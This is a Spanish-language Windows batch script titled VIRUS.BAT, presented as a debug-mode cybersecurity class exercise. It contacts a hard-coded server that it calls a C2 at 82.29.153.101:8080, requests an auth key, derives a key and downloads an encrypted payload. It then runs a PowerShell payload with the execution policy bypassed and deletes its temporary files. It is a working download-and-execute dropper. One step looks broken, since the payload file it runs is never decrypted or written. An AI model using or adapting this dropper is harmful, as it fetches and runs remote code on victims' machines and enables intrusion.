@echo off
REM =====================================================
REM 🔥 VIRUS.BAT - DEBUG COMPLETO PARA MAESTRO
REM =====================================================
REM ! MODO DEBUG: MUESTRA TODO EN PANTALLA + LOGS !
REM =====================================================
title Ciberseguridad DEBUG - Paso a Paso
color 0A

echo.
echo =====================================================
echo    🔥 PRÁCTICA CIBERSEGURIDAD - MODO DEBUG
echo =====================================================
echo    Computadora: %COMPUTERNAME%
echo    Usuario: %USERNAME%
echo    Fecha/Hora: %DATE% %TIME%
echo =====================================================
echo.
echo [DEBUG 0/7] Creando logs...
set "LOG=%TEMP%\CiberDEBUG_%RANDOM%_%TIME:~0,2%%TIME:~3,2%.log"
echo [%DATE% %TIME%] === INICIO DEBUG === > "%LOG%"
echo [%DATE% %TIME%] Sistema: %COMPUTERNAME% >> "%LOG%"
echo [%DATE% %TIME%] Usuario: %USERNAME% >> "%LOG%"
echo [DEBUG 0/7] Log creado: %LOG%
timeout /t 1 /nobreak >nul

echo.
echo [DEBUG 1/7] Verificando conectividad VPS...
ping 82.29.153.101 -n 2 >nul
if %errorlevel% neq 0 (
    echo ❌ ERROR: VPS NO ALCANZABLE >> "%LOG%"
    echo ❌ VPS 82.29.153.101 NO RESPONDE!
    echo [%DATE% %TIME%] ERROR VPS >> "%LOG%"
    pause
    exit /b 1
)
curl -s http://82.29.153.101:8080/health >nul || (
    echo ❌ ERROR: Puerto 8080 NO responde >> "%LOG%"
    echo ❌ Puerto 8080 C2 NO ACTIVO!
    pause
    exit /b 1
)
echo ✓ VPS OK - Puerto 8080 activo
echo [%DATE% %TIME%] VPS OK >> "%LOG%"
timeout /t 1 /nobreak >nul

echo.
echo [DEBUG 2/7] Generando timestamp auth...
powershell -c "Write-Host ([int](Get-Date -UFormat '%%s'))"
for /f %%i in ('powershell -c "[int](Get-Date -UFormat \"%%s\")"') do set TS=%%i
echo TS generado: %TS%
echo [%DATE% %TIME%] Timestamp: %TS% >> "%LOG%"
timeout /t 1 /nobreak >nul

echo.
echo [DEBUG 3/7] Solicitando AUTH KEY...
echo URL: http://82.29.153.101:8080/auth/key?ts=%TS%
curl -s "http://82.29.153.101:8080/auth/key?ts=%TS%" > "%TEMP%\auth.key"
if not exist "%TEMP%\auth.key" (
    echo ❌ ERROR: Auth key NO recibida >> "%LOG%"
    echo ❌ Auth key falló!
    pause
    exit /b 1
)
for %%F in ("%TEMP%\auth.key") do set /a "SIZE=%%~zF"
echo ✓ Auth key OK (%SIZE% bytes)
type "%TEMP%\auth.key"
echo [%DATE% %TIME%] Auth OK %SIZE%b >> "%LOG%"
timeout /t 2 /nobreak >nul

echo.
echo [DEBUG 4/7] Generando payload key...
powershell -c "
$s='CyberDefense2024_FixedSalt_32charsExactly!!%TS%';
$k=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($s));
$pkey=[string]::Join('',$k[0..43]);
Write-Host \"Payload Key: \$pkey\";
\$pkey | Out-File '%TEMP%\payload_key.txt'
"
set /p PAYLOAD_KEY=<"%TEMP%\payload_key.txt"
echo Payload Key: %PAYLOAD_KEY%
echo [%DATE% %TIME%] Payload Key generada >> "%LOG%"
timeout /t 2 /nobreak >nul

echo.
echo [DEBUG 5/7] DESCARGANDO PAYLOAD...
echo Header: X-Decrypt-Key: %PAYLOAD_KEY%
curl -H "X-Decrypt-Key: %PAYLOAD_KEY%" ^
     "http://82.29.153.101:8080/payload/encrypted" ^
     -o "%TEMP%\payload.enc" -s -w "%%{http_code} %%{size_download}\n"

if not exist "%TEMP%\payload.enc" (
    echo ❌ ERROR: Payload NO descargado >> "%LOG%"
    echo ❌ Descarga falló!
    pause
    exit /b 1
)
for %%F in ("%TEMP%\payload.enc") do set /a "PSIZE=%%~zF"
echo ✓ PAYLOAD DESCARGADO (%PSIZE% bytes)
echo [%DATE% %TIME%] Payload %PSIZE%b >> "%LOG%"
timeout /t 1 /nobreak >nul

echo.
echo [DEBUG 6/7] EJECUTANDO PAYLOAD...
echo powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\payload.ps1"
powershell -WindowStyle Normal -ExecutionPolicy Bypass -File "%TEMP%\payload.ps1"
echo.
echo [%DATE% %TIME%] Payload ejecutado >> "%LOG%"
timeout /t 3 /nobreak >nul

echo.
echo [DEBUG 7/7] VERIFICANDO RESULTADO...
if exist "%PUBLIC%\Desktop\SystemDiagnostic.log" (
    echo ✓ ✓ ✓ MARCA DE ÉXITO ENCONTRADA ✓ ✓ ✓
    echo ========================================
    type "%PUBLIC%\Desktop\SystemDiagnostic.log"
    echo ========================================
    echo [%DATE% %TIME%] Marker OK >> "%LOG%"
) else (
    echo ⚠️  SIN MARCA - Payload pudo fallar
    echo [%DATE% %TIME%] Sin marker >> "%LOG%"
)

echo.
echo 🧹 LIMPIANDO ARCHIVOS TEMPORALES...
del "%TEMP%\auth.key" "%TEMP%\payload_key.txt" "%TEMP%\payload.enc" "%TEMP%\payload.ps1" >nul 2>&1
echo ✓ Archivos temporales borrados
echo [%DATE% %TIME%] Limpieza OK >> "%LOG%"

echo.
echo =====================================================
echo    ✅ PRÁCTICA COMPLETADA CON ÉXITO
echo =====================================================
echo.
echo 📋 LOG COMPLETO: %LOG%
echo 📁 ABRIENDO CARPETA TEMP...
start "" "%TEMP%"
echo.
echo 🎓 PARA AUDITORÍA:
echo    1. %LOG% (log detallado)
echo    2. Desktop\SystemDiagnostic.log (marker payload)
echo.
pause